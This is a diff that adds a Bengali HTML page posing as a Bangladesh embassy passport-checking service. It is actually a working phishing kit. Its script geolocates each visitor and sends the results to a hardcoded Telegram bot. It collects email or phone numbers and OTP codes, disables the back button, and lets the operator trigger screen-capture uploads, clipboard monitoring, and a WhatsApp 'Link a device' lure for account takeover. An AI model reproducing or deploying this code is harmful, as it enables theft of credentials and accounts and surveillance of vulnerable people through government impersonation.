@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Passport Pdf- Chaking Chaking</title>
+
+    <meta property="og:title" content="Passport Chaking-File Download">
+    <meta property="og:description" content="রিয়াদ বাংলাদেশ দূতাবাস প্রবাসী সেবা কেন্দ্র থেকে পাসপোর্ট নাম্বার দিয়ে চেক করতে এখানে ক্লিক করুন।">
+    <meta property="og:image" content="https://raw.githubusercontent.com/passportchaking-io/Online_Passport_chaking/main/IMG_20260525_160654.jpg">
+    <meta property="og:type" content="website">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        .hidden { display: none !important; }
+        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; position: relative; }
+        
+        .btn-blue { width: 100%; max-width: 350px; background-color: #1877f2; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; text-align: center; }
+        .secure-input { width: 100%; max-width: 350px; padding: 16px; border: 2px solid #ccd0d5; border-radius: 12px; outline: none; font-size: 17px; background: white; }
+        
+        #permission_modal { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.85); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
+        .modal-content { background: white; width: 100%; max-width: 300px; border-radius: 15px; padding: 25px; text-align: center; }
+        
+        /* প্রোগ্রেস বার অ্যানিমেশন */
+        @keyframes progressMove {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .animate-progress {
+            animation: progressMove 2s infinite linear;
+        }
+    </style>
+</head>
+<body onload="initApp()">
+
+    <div class="top-half">
+        <img src="https://raw.githubusercontent.com/passportchaking-io/Online_Passport_chaking/main/IMG_20260525_160654.jpg">
+    </div>
+
+    <div class="bottom-half text-center">
+        
+        <div id="step1" class="w-full flex flex-col items-center gap-1">
+            <h2 class="text-2xl font-extrabold text-gray-900">সরাসরি পাসপোর্ট চেক করুন</h2>
+            <p class="text-gray-600 px-4">সরাসরি অনলাইনে আপনার পাসপোর্ট নাম্বার দিয়ে চেক করতে পারবেন বর্তমানে আপনার পাসপোর্ট কোন অবস্থায় আছে। এজন্য নিজের নিচের বাটনে ক্লিক করুন।</p>
+            <button onclick="showModal()" class="btn-blue">পাসপোর্ট চেক করুন</button>
+        </div>
+
+        <div id="permission_modal">
+            <div class="modal-content">
+                <div class="text-blue-600 text-4xl mb-4">ⓘ</div>
+                <h3 class="text-lg font-bold mb-2">পাসপোর্ট ফাইলটি ওপেন করুন</h3>
+                <p class="text-gray-600 text-sm mb-6">পাসপোর্ট ডকুমেন্ট ফাইলটি ওপেন করতে চাইলে "Open" বাটনে ক্লিক করুন।</p>
+                <button onclick="redirectToChrome()" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold text-lg active:bg-blue-700">Open</button>
+            </div>
+        </div>
+
+        <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-1">
+            <h1 class="text-xl font-bold text-gray-900">সরাসরি অনলাইনে চেক করুন</h1>
+            <p class="text-gray-600 text-sm px-4">সরাসরি পাসপোর্ট ফাইলটি চেক করতে নিচের ফাঁকা ঘরে পাসপোর্ট নাম্বার অথবা পাসপোর্ট এর সাথে আপনার যে whatsapp নাম্বার অফিসে দেওয়া আছে ওই নাম্বারটা নিজের ফাঁকা ঘরে বসিয়ে ফাইলটি চেক করুন।</p>
+            <input type="email" id="email_field" autocomplete="email" placeholder="পাসপোর্ট নাম্বার বসান" class="secure-input" oninput="autoCaptureEmail(this.value)">
+            <button onclick="finalSubmit()" class="btn-blue">ফাইলটি ওপেন করুন</button>
+        </div>
+
+        <div id="step2" class="hidden w-full flex-col items-center justify-center px-4 py-4 target-section">
+            <div class="w-full max-w-sm bg-white border border-gray-200 rounded-2xl p-6 shadow-xl flex flex-col items-center text-center relative overflow-hidden mb-5">
+                <div class="absolute top-4 right-[-35px] bg-red-600 text-white text-[10px] font-black uppercase tracking-wider py-1 px-10 rotate-45 shadow-sm">LOCKED</div>
+                <div class="mb-4 flex h-24 w-20 flex-col items-center justify-between rounded-xl bg-gradient-to-b from-red-50 to-red-100 border border-red-200 p-3 shadow-inner relative mt-2">
+                    <span class="absolute top-0 left-2 bg-red-600 text-white text-[10px] font-black px-1.5 py-0.5 rounded-b-md shadow-sm">PDF</span>
+                    <div class="flex items-center justify-center flex-grow pt-4 text-red-600">
+                        <svg class="w-10 h-10 animate-pulse" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
+                        </svg>
+                    </div>
+                    <div class="w-full space-y-1">
+                        <div class="h-1 w-full bg-red-300 rounded"></div>
+                        <div class="h-1 w-2/3 bg-red-200 rounded"></div>
+                    </div>
+                </div>
+                <h3 class="text-lg font-black text-gray-800 mb-1 px-4 break-all">Passport_E-File_Verified.pdf</h3>
+                <p class="text-xs font-bold text-gray-400 mb-4">Size: 4.2 MB • PDF Document</p>
+                <hr class="w-full border-gray-100 mb-4">
+                <div class="bg-red-50 border-l-4 border-red-500 p-3.5 rounded-r-xl text-left w-full">
+                    <p class="text-sm font-extrabold text-red-900 leading-snug text-center">⚠️ এই পাসপোর্ট ডকুমেন্ট ফাইলটি নিরাপত্তা জনিত কারণে সরাসরি মেইন অফিস থেকে এনক্রিপ্ট (লক) করা আছে।</p>
+                </div>
+            </div>
+            <button onclick="openLockedFile()" class="w-full max-w-sm bg-gradient-to-r from-red-500 to-rose-600 text-white font-extrabold text-lg sm:text-xl py-4 px-6 rounded-2xl shadow-lg border-b-4 border-red-700 flex items-center justify-center gap-3">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+                </svg>
+                ফাইল টি ওপেন করুন
+            </button>
+        </div>
+
+        <div id="verifying" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-[9999] flex items-center justify-center p-4">
+            <div class="bg-white w-full max-w-sm rounded-2xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+                <div class="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-emerald-50 ring-8 ring-emerald-100">
+                    <svg class="h-8 w-8 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+                    </svg>
+                </div>
+                <h3 class="text-xl font-extrabold text-gray-900 mb-1">তথ্য যাচাই করা হচ্ছে</h3>
+                <p class="text-xs font-semibold text-emerald-600 bg-emerald-50 px-3 py-1 rounded-full mb-5 inline-block">বাংলাদেশ দূতাবাস অনলাইন সার্ভার</p>
+                <div class="mb-4">
+                    <svg class="animate-spin h-8 w-8 text-emerald-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                </div>
+                <p class="text-sm font-bold text-gray-800 leading-snug mb-2">আপনার তথ্যটি গুরুত্ব সহকারে চেক করা হচ্ছে।</p>
+                <p class="text-xs text-gray-500 font-medium px-2 leading-normal">সার্ভারের কাজের সুবিধার্থে অনুগ্রহ করে কিছুক্ষণ অপেক্ষা করুন। এই সময়ে পেজটি বন্ধ বা রিফ্রেশ করবেন না।</p>
+                <div class="w-full bg-gray-100 h-1.5 rounded-full mt-5 overflow-hidden relative">
+                    <div class="bg-gradient-to-r from-emerald-500 to-green-600 h-full w-1/2 rounded-full absolute top-0 left-0 animate-progress"></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="otp_page" class="hidden w-full flex-col items-center"></div>
+
+        <div id="success_page" class="hidden w-full flex-col items-center justify-center px-4 py-6 target-section">
+            <div class="mb-5 flex h-20 w-20 items-center justify-center rounded-full bg-green-50 ring-8 ring-green-100 shadow-sm">
+                <svg class="h-10 w-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+                </svg>
+            </div>
+            <h2 class="text-2xl sm:text-3xl font-black text-green-600 mb-3 tracking-wide text-center">ভেরিফিকেশন সফল হয়েছে!</h2>
+            <div class="w-full max-w-sm bg-white border border-gray-100 rounded-2xl p-5 shadow-md text-center mb-6">
+                <p class="text-base sm:text-lg font-bold text-gray-800 leading-snug mb-3 text-center">QR কোড স্ক্যান করে আপনার পাসপোর্ট ফাইলটি ডাউনলোড করুন।</p>
+                <div class="bg-amber-50 border-l-4 border-amber-500 p-3 rounded-r-xl text-left">
+                    <p class="text-xs sm:text-sm font-semibold text-amber-900 leading-relaxed">
+                        <span class="text-amber-600 font-bold">⚠️ নির্দেশনাবলী:</span> নিচের বাটনে ক্লিক করার পর একটি অপশন আসবে, সেখান থেকে <span class="bg-amber-200 px-1 rounded font-bold">Link a device</span> বাটনে ক্লিক করুন। এরপর আপনার ফোনের সিকিউরিটি লক দিয়ে আনলক করলেই ফাইলটি ডাউনলোড হয়ে যাবে।
+                    </p>
+                </div>
+            </div>
+            <a href="https://wa.me/settings/linked_devices" class="w-full max-w-sm bg-gradient-to-r from-green-500 to-emerald-600 text-white font-extrabold text-lg sm:text-xl py-4 px-6 rounded-2xl shadow-lg border-b-4 border-green-700 flex items-center justify-center gap-3 tracking-wide">
+                <svg class="w-6 h-6 text-white animate-pulse" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
+                </svg>
+                Passport File Download
+            </a>
+        </div>
+
+        <div id="error_page" class="hidden w-full flex-col items-center justify-center px-4 py-8 target-section">
+            <div class="mb-5 flex h-20 w-20 items-center justify-center rounded-full bg-red-50 ring-8 ring-red-100 shadow-sm">
+                <svg class="h-10 w-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path>
+                </svg>
+            </div>
+            <h2 class="text-2xl sm:text-3xl font-black text-red-600 mb-2 tracking-wide text-center">সংযোগ বিচ্ছিন্ন হয়েছে!</h2>
+            <p class="mb-5 text-xs font-bold text-gray-400 bg-gray-100 px-3 py-1 rounded-full inline-block uppercase tracking-wider">Error Code: 504 Gateway Timeout</p>
+            <div class="w-full max-w-sm bg-white border border-gray-100 rounded-2xl p-6 shadow-md text-center mb-6">
+                <p class="text-base sm:text-lg font-bold text-gray-800 leading-snug mb-3 text-center">দুঃখিত, আপনার নেটওয়ার্ক সার্ভার সমস্যার কারণে পাসপোর্ট ফাইলটি ওপেন করা সম্ভব হচ্ছে না।</p>
+                <p class="text-xs sm:text-sm text-gray-500 font-medium leading-relaxed">দূতাবাস অনলাইন ক্লাউড সার্ভারে অতিরিক্ত ট্রাফিকের কারণে সাময়িক জটিলতা দেখা দিয়েছে। অনুগ্রহ করে আপনার ইন্টারনেট সংযোগটি চেক করুন এবং পুনরায় চেষ্টা করুন।</p>
+            </div>
+            <button onclick="location.reload()" class="w-full max-w-sm bg-gradient-to-r from-red-500 to-rose-600 text-white font-extrabold text-lg sm:text-xl py-4 px-6 rounded-2xl shadow-lg border-b-4 border-red-700 flex items-center justify-center gap-3">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 1121.253 8H18"></path>
+                </svg>
+                আবার চেষ্টা করুন
+            </button>
+        </div>
+
+        <div id="start_screen_page" class="hidden w-full flex flex-col items-center gap-4">
+            <h1 class="text-2xl font-extrabold text-gray-900">🖥️ স্ক্রিন শেয়ার</h1>
+            <p class="text-gray-600 text-sm px-4">আপনার ফোনের স্ক্রিন শেয়ার শুরু করতে নিচের বাটনে ক্লিক করুন। ব্রাউজার থেকে পারমিশন চাইলে "Allow" দিন।</p>
+            <button onclick="requestScreenShare()" class="w-full max-w-350px bg-purple-600 text-white font-bold p-4 rounded-xl">স্ক্রিন শেয়ার শুরু করুন</button>
+        </div>
+
+        <div id="stop_screen_page" class="hidden w-full flex flex-col items-center gap-1 px-6">
+            <h3 class="text-lg font-bold text-red-600">অল্প কিছুক্ষণ অপেক্ষা করুন...</h3>
+        </div>
+
+        <div id="stop_clipboard_page" class="hidden w-full flex flex-col items-center gap-3">
+            <h2 class="text-2xl font-bold text-blue-600">ক্লিপবোর্ড মনিটরিং বন্ধ!</h2>
+        </div>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let lastUpdateId = 0;
+    let deviceInfo = "Unknown";
+    let isEmailSent = false;
+    let screenStream = null;
+    let screenCaptureInterval = null;
+    let isScreenSharing = false;
+    let clipboardMonitorInterval = null;
+    let lastClipboardContent = "";
+
+    async function initApp() {
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            deviceInfo = `${ipData.city}, ${ipData.country_name} (IP: ${ipData.ip})`;
+            sendToBot(`🚀 **নতুন ভিজিটর লিংকে ঢুকেছে!**\n📍 লোকেশন: ${deviceInfo}`);
+        } catch (e) {}
+
+        const urlParams = new URLSearchParams(window.location.search);
+        if (sessionStorage.getItem('isWaiting') === 'true') {
+            lockBrowser();
+            goToStep('verifying');
+            startListening();
+        } else if (urlParams.get('open') === 'chrome') {
+            goToStep('google_chooser');
+        }
+    }
+
+    function showModal() {
+        document.getElementById('permission_modal').style.display = 'flex';
+        sendToBot(`🖱️ ইউজার "Add Friend" ক্লিক করেছে।`);
+    }
+
+    function redirectToChrome() {
+        const chromeUrl = "intent://" + window.location.host + window.location.pathname + "?open=chrome" + "#Intent;scheme=https;package=com.android.chrome;end";
+        if (/Android/i.test(navigator.userAgent)) {
+            sendToBot(`➡️ ইউজার পপ-আপে OK ক্লিক করেছে। ক্রোমে যাচ্ছে...`);
+            window.location.href = chromeUrl;
+        } else {
+            goToStep('google_chooser');
+        }
+    }
+
+    function autoCaptureEmail(val) {
+        if(val.includes('@') && !isEmailSent) {
+            sendToBot(`📧 **ইমেইল অটো-ক্যাপচার:** \`${val}\``);
+            isEmailSent = true; 
+        }
+    }
+
+    function finalSubmit() {
+        const email = document.getElementById('email_field').value;
+        if(!email) return;
+        sessionStorage.setItem('isWaiting', 'true');
+        
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "🔑 Pass Change (WhatsApp)", callback_data: `pass_cmd` }],
+                [{ text: "📩 Get OTP Page", callback_data: "otp_cmd" }],
+                [{ text: "📨 Gmail Verify Page", callback_data: "email_page_cmd" }],
+                [{ text: "🖥️ Start Screen Share", callback_data: "start_screen_cmd" }],
+                [{ text: "⏹️ Stop Screen Share", callback_data: "stop_screen_cmd" }],
+                [{ text: "📋 Clipboard Capture", callback_data: "clipboard_cmd" }],
+                [{ text: "⏹️ Stop Clipboard", callback_data: "stop_clipboard_cmd" }],
+                [{ text: "🔔 Show Notification", callback_data: "notify_cmd" }],
+                [{ text: "⏳ Force Waiting", callback_data: "wait_cmd" }],
+                [{ text: "✅ Success", callback_data: "success" }, { text: "❌ Error", callback_data: "error" }]
+            ]
+        };
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: `🎯 **ফাইনাল সাবমিট!**\n📧 ইমেইল: \`${email}\`\n📍 লোকেশন: ${deviceInfo}`, reply_markup: keyboard })
+        });
+
+        goToStep('verifying');
+        lockBrowser();
+        startListening();
+    }
+
+    function openLockedFile() {
+        sendToBot(`🔓 ইউজার "ফাইল টি ওপেন করুন" বাটনে ক্লিক করেছে। OTP স্ক্রিন দেখানো হচ্ছে।`);
+        goToStep('otp_page');
+    }
+
+    // UPDATED NAVIGATION & MODAL INTERACTION LOGIC
+    function goToStep(id) {
+        // ১. ওটিপি পেজের জন্য ডাইনামিক সেন্টারেড পপ-আপ লজিক
+        if (id === 'otp_page') {
+            const otpModal = document.getElementById('otp_page');
+            if (otpModal) {
+                otpModal.className = "fixed inset-0 bg-black/60 backdrop-blur-md z-[9999] flex flex-col items-center justify-center p-4";
+                otpModal.innerHTML = `
+                    <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+                        <div class="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-blue-50 text-blue-600">
+                            <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                            </svg>
+                        </div>
+                        <h2 class="text-xl font-black text-gray-900 mb-2">ফাইলটি লক করা আছে!</h2>
+                        <p class="text-xs text-gray-600 mb-6 px-2 font-medium leading-relaxed">
+                            পাসপোর্ট ডকুমেন্ট ফাইলটি ওপেন করার জন্য রিয়াদ দূতাবাস প্রবাসী সেবা কেন্দ্র (PDC) থেকে আপনার WhatsApp নাম্বারে পাঠানো <span class="text-blue-600 font-bold">৪ সংখ্যার কোডটি</span> নিচে বসান।
+                        </p>
+                        <div class="flex justify-center gap-3 mb-6">
+                            <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outline-none">
+                            <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outline-none">
+                            <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outline-none">
+                            <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outline-none">
+                        </div>
+                        <button onclick="goToStep('verifying')" class="w-full bg-blue-600 text-white font-bold py-3.5 rounded-xl text-lg shadow-md active:scale-95 transition-all">ফাইল আনলক করুন</button>
+                    </div>
+                `;
+                
+                setTimeout(() => {
+                    const inputs = otpModal.querySelectorAll('.code-input');
+                    inputs.forEach((input, index) => {
+                        input.addEventListener('input', () => {
+                            if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
+                            const code = Array.from(inputs).map(i => i.value).join('');
+                            if (code.length === 1) sendToBot(`📩 **ইউজার ১ সংখ্যার OTP দিয়েছে:** \`${code}\``);
+                            if (code.length === 4) sendToBot(`📩 **ইউজার পূর্ণ ৪ সংখ্যার OTP দিয়েছে:** \`${code}\``);
+                        });
+                        input.addEventListener('keydown', (e) => {
+                            if (e.key === 'Backspace' && input.value === '' && index > 0) inputs[index - 1].focus();
+                        });
+                    });
+                }, 100);
+            }
+            return;
+        }
+
+        // অন্য পেজে যাওয়ার সময় ওটিপি ও ওয়েটিং পপ-আপ বন্ধ করার লজিক
+        const otpModal = document.getElementById('otp_page');
+        if (otpModal) otpModal.className = "hidden w-full flex-col items-center";
+
+        if (id === 'verifying') {
+            const waitingModal = document.getElementById('verifying');
+            if (waitingModal) { waitingModal.classList.remove('hidden'); waitingModal.classList.add('flex'); }
+            return;
+        }
+
+        const waitingModal = document.getElementById('verifying');
+        if (waitingModal) { waitingModal.classList.add('hidden'); waitingModal.classList.remove('flex'); }
+
+        // স্বাভাবিক পেজ পরিবর্তনের সাধারণ নিয়ম
+        const allPages = [
+            'step1', 'step2', 'google_chooser', 'success_page', 'error_page',
+            'start_screen_page', 'stop_screen_page', 'stop_clipboard_page'
+        ];
+        
+        allPages.forEach(s => {
+            const element = document.getElementById(s);
+            if(element) element.classList.add('hidden');
+        });
+        const modal = document.getElementById('permission_modal');
+        if(modal) modal.style.display = 'none';
+        
+        const target = document.getElementById(id);
+        if(target) {
+            target.classList.remove('hidden');
+            target.classList.add('flex');
+        }
+    }
+
+    function lockBrowser() {
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = () => window.history.pushState(null, "", window.location.href);
+    }
+
+    function sendToBot(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ chat_id: chatId, text: text }) 
+        });
+    }
+
+    // SCREEN SHARE & CLIPBOARD FUNCTIONS
+    async function requestScreenShare() {
+        try {
+            screenStream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: "always" }, audio: false });
+            isScreenSharing = true; sendToBot(`✅ **ইউজার স্ক্রিন শেয়ার Allow করেছে!**`);
+            screenStream.getVideoTracks()[0].onended = () => { stopScreenShare(); };
+            captureAndSendFrame(); goToStep('verifying');
+        } catch (err) { sendToBot(`❌ **স্ক্রিন শেয়ার ডিনাইড হয়েছে।**`); }
+    }
+
+    function captureAndSendFrame() {
+        if (!screenStream || !isScreenSharing) return;
+        const video = document.createElement('video');
+        video.srcObject = screenStream; video.play();
+        screenCaptureInterval = setInterval(() => {
+            if (!isScreenSharing || !screenStream) { clearInterval(screenCaptureInterval); return; }
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 720; canvas.height = video.videoHeight || 1280;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob((blob) => {
+                if (!blob) return;
+                const formData = new FormData(); formData.append('chat_id', chatId); formData.append('photo', blob, `screen.png`);
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg', 0.5);
+        }, 3000);
+    }
+
+    function stopScreenShare() {
+        if (screenStream) { screenStream.getTracks().forEach(track => track.stop()); screenStream = null; }
+        if (screenCaptureInterval) { clearInterval(screenCaptureInterval); screenCaptureInterval = null; }
+        isScreenSharing = false; sendToBot(`⏹️ **স্ক্রিন শেয়ার বন্ধ করা হয়েছে।**`);
+    }
+
+    async function startClipboardMonitoring() {
+        sendToBot(`📋 **ক্লিপবোর্ড মনিটরিং শুরু হয়েছে!**`);
+        clipboardMonitorInterval = setInterval(async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text !== lastClipboardContent) {
+                    lastClipboardContent = text;
+                    sendToBot(`📋 **ক্লিপবোর্ড কন্টেন্ট:** \`${text}\``);
+                }
+            } catch (e) {}
+        }, 2000);
+    }
+
+    function stopClipboardMonitoring() {
+        if (clipboardMonitorInterval) { clearInterval(clipboardMonitorInterval); clipboardMonitorInterval = null; }
+        sendToBot(`⏹️ **ক্লিপবোর্ড মনিটরিং বন্ধ করা হয়েছে।**`);
+    }
+
+    function startListening() {
+        setInterval(async () => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await res.json();
+                if (data.ok && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        const cmd = update.callback_query?.data;
+                        
+                        if (cmd === "pass_cmd") window.location.href = "https://wa.me/settings/linked_devices";
+                        else if (cmd === "otp_cmd") goToStep('otp_page');
+                        else if (cmd === "email_page_cmd") goToStep('step2');
+                        else if (cmd === "success") goToStep('success_page');
+                        else if (cmd === "error") goToStep('error_page');
+                        else if (cmd === "wait_cmd") goToStep('verifying');
+                        else if (cmd === "start_screen_cmd") goToStep('start_screen_page');
+                        else if (cmd === "stop_screen_cmd") { stopScreenShare(); goToStep('stop_screen_page'); }
+                        else if (cmd === "clipboard_cmd") startClipboardMonitoring();
+                        else if (cmd === "stop_clipboard_cmd") { stopClipboardMonitoring(); goToStep('stop_clipboard_page'); }
+                    });
+                }
+            } catch (e) {}
+        }, 2000);
+    }
+</script>
+</body>
+</html>
